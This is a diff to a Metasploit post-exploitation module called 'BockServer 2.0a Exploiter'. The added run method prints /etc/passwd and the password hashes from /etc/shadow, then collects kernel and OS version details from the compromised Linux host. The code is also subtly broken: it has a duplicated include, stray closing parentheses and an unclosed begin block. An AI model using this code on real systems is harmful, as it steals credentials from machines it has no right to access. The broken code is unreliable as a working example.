@@ -1,6 +1,9 @@
 require 'msf/core'
 
-class MetasploitModule < Msf::Exploit::Remote
+class MetasploitModule < Msf::Post
+    include Msf::Post::File
+    include Msf::Post::Linux::Priv
+    include Msf::Post::Linux::Priv
     def initialize
         super(
             'Name'           => 'BockServer 2.0a Exploiter',
@@ -14,6 +17,17 @@ class MetasploitModule < Msf::Exploit::Remote
     end
     
     def run
-    
+	begin
+	    puts "The users are: "
+	    puts read_file("/etc/passwd")
+	    puts "The password hashes are"
+    	    puts read_file("/etc/shadow")
+	rescue
+    	    print_status("could not print users/passwds")
+	end	   
+        begin 
+	    sysinfo = get_sysinfo
+    	    puts "The Kernel Version on the system is: #{sysinfo[:kernel]}")	    
+	    puts "The OS Version is #{sysinfo[:distro]} #{sysinfo[:version]}")
     end
 end
